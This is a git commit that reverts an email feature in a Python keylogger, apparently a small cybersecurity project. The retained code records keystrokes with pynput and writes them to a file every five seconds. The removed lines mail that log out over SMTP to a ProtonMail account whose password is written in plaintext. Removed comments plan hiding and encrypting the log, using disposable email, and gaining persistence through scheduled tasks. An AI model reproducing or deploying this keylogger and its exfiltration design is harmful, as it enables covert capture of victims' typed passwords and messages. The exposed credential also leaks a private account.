ff64d8642a74347ebad007d96e0eca19bdda053e
richurross <richh.t.le@gmail.com>
2023-04-27 17:04:51 -0700

    Revert "Added email functionality for sending the logged files. Should send anonymously through a disposable email aka ProtonMail with the file as an attachment."
    This reverts commit a632830348c5515575dd5074d21348a62db08205.

--- main.py
+++ main.py
@@ -2,55 +2,8 @@ from pynput import keyboard
 
 import datetime as dt
 import threading
-import requests
-
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
-
-# Mailing Information
-sender = 'cybersecprojectplus@protonmail.com'
-recipient = 'cybersecprojectplus@protonmail.com'
-smtp_server = 'smtp.protonmail.com'
-smtp_port = 465
-username = 'cybersecprojectplus@protonmail.com'
-password = '^pVTK4^%obYBN8Lu'
-subject = 'Logged Information'
-body = 'Python Mail.'
 
 string = ""
-
-file_path = "C:\\Users\\richie\\PycharmProjects\\keylogger\\main.py"
-
-def send_email(sender, recipient, subject, body, smtp_server, smtp_port, username, password, filename, attachment):
-    # Set up the email message
-    msg = MIMEMultipart()
-    msg['From'] = sender
-    msg['To'] = recipient
-    msg['Subject'] = subject
-    msg.attach(MIMEText(body, 'plain'))
-
-    filename = filename
-    attachment = open(attachment, 'rb')
-
-    p = MIMEBase('application', 'octet-stream')
-
-    p.set_payload((attachment).read())
-
-    encoders.encode_base64(p)
-
-    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-
-    msg.attach(p)
-
-    # Set up the SMTP connection
-    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
-        server.login(username, password)
-        server.sendmail(sender, recipient, msg.as_string())
-
-    print('Email sent successfully.')
 
 def on_press(key):
     global string
@@ -63,15 +16,16 @@ def on_press(key):
             string += " "
         elif key == keyboard.Key.shift:
             pass
-        # Skip if there is no data in string variable
+        #Skip if there is no data in string variable
         elif key == keyboard.Key.backspace and len(string) == 0:
             pass
-        # Keeps logged keys up to date even with backspace
+        #Keeps logged keys up to date even with backspace
         elif key == keyboard.Key.backspace and len(string) > 0:
             string = string[:-1]
         elif key == keyboard.Key.esc:
             return False
         else:
+            # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
             string += str(key).replace("'", "")
     except AttributeError:
         print(f'special key {key} pressed')
@@ -83,10 +37,9 @@ def on_release(key):
         # Stop listener
         return False
 
-
 def log_data():
     global string
-    threading.Timer(5.0, log_data).start()  # schedule next execution in 5 seconds
+    threading.Timer(5.0, log_data).start() # schedule next execution in 5 seconds
     with open('data.txt', 'a') as f:
         timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
         f.write(f'{timestamp}: {string}\n')
@@ -103,13 +56,3 @@ with keyboard.Listener(
         on_release=on_release) as listener:
     listener.join()
 
-send_email(sender, recipient, subject, body, smtp_server, smtp_port, username, password, 'data.txt', 'data.txt')
-
-# Try to Obfuscate log file and content by randomly generating its name and keeping track of it in keylogger process
-# - Encrypt data
-# use disposable emails (IE mailinatior) to dump encrypted log files instead of main email
-# This would make sure that your keylogger returns you a log file even
-# after the computer has shutdown/restarted. If you made me, I would do it like this : Make a function to add the script
-# to scheduled tasks then another function to log files. For logs I would create a directory to save logfiles to, create
-# a subdirectory called old. Active log file goes to the /log/current-logfile.txt once it has been successfully sent its
-# moved to old directory with a timestamp. /log/old/10-02-2020-logfile.txt .
